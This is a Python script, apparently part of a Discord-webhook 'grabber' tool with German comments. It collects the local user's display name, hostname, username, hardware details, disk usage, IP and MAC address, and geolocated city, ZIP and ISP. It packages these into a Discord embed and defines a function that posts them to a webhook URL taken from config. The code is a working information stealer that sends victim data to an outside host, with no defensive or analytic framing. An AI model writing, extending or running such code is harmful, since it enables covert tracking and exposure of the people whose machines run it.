from config import *
from discord_webhook import DiscordWebhook, DiscordEmbed
from profil_picture import set_webhook_avatar_from_url
import geo
import user_info
import disk_info
import system_info

webhook_url = DEFAULT_WEBHOOK 


image_url = 'https://cdn.discordapp.com/avatars/648508571734245376/a_04f5199ee21d38b6aac9cd7381675efe.jpeg' 
set_webhook_avatar_from_url(webhook_url, image_url)

color = DEFAULT_COLOR
title = WEBHOOK_TITLE
description = WEBHOOK_DESCRIPTION
username = USERNAME
partitions = disk_info.get_all_partitions()

webhook = DiscordWebhook(url=webhook_url, content="", username=username, rate_limit_retry=True)

# Nutzen Sie f-Strings und mehrzeilige Strings für bessere Lesbarkeit
user_field_value = f'''```
Display Name: {user_info.get_display_name()} 
Hostname: {user_info.get_hostname()} 
Username: {user_info.get_username()}
```'''

# Hier nehmen wir an, dass system_info.get_gpus_info() eine Liste von GPUs zurückgibt
gpus = system_info.get_gpus_info()
gpu_list_string = "\n".join(gpus)  # Dies wird die GPUs in separate Zeilen aufteilen

system_field_value = f'''```
CPU: {system_info.get_cpu_info()} 
GPU: {gpu_list_string}
RAM: {system_info.get_ram_info():.1f} GB
```'''


embed = DiscordEmbed(title=title, description=description, color=color)
embed.add_embed_field(name=":bust_in_silhouette: User", value=f"```Display Name: {user_info.get_display_name()} \nHostname: {user_info.get_hostname()} \nUsername: {user_info.get_username()}```", inline=False)
embed.add_embed_field(name=":desktop: System", value=system_field_value, inline=False)


for partition in partitions:
    try:
        usage = disk_info.get_disk_usage(partition.mountpoint)
        value = f"```Total Size: {disk_info.convert_bytes(disk_info.get_total_size(usage))}\nUsed: {disk_info.convert_bytes(disk_info.get_used_space(usage))}\nFree: {disk_info.convert_bytes(disk_info.get_free_space(usage))}\nPercentage Used: {disk_info.get_percent_used(usage)}%```"
        embed.add_embed_field(name=f":floppy_disk: Disk: {partition.device}", value=value, inline=False)
    except Exception:
        pass  

embed.add_embed_field(name=":satellite: Network Information", value=f"```IP Address: {geo.get_own_ip()} \nMAC Address: {geo.get_mac()}\nCountry: {geo.get_country()} \nRegion: {geo.get_region()} \nCity: {geo.get_city()} ({geo.get_zip()}) \nISP: {geo.get_isp()}```", inline=False)


webhook.add_embed(embed=embed)

def send_webhook():
    response = webhook.execute()